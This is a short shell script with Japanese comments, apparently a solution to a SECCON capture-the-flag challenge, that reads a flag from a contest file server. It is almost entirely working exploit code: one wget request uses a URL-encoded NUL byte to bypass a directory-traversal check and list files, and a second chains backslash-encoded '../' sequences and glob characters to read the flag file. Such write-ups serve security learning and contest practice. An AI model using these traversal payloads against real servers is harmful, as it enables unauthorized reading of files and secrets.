# 1. NUL文字によるディレクトリトラバーサルチェック回避を行いフラグファイル名を取得する
filename=$(wget http://fileserver.chal.seccon.jp:9292/a%00/tmp/flags/ -q -O - | grep '\w\+.txt' -o | head -n 1)

# 2. バックスラッシュによるフィルタ回避を利用してフラグの中身を取得する
flag=$(wget http://fileserver.chal.seccon.jp:9292/.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./tm%7Bp%2C%5C%5B%7D/flags/$filename -q -O -)

echo $flag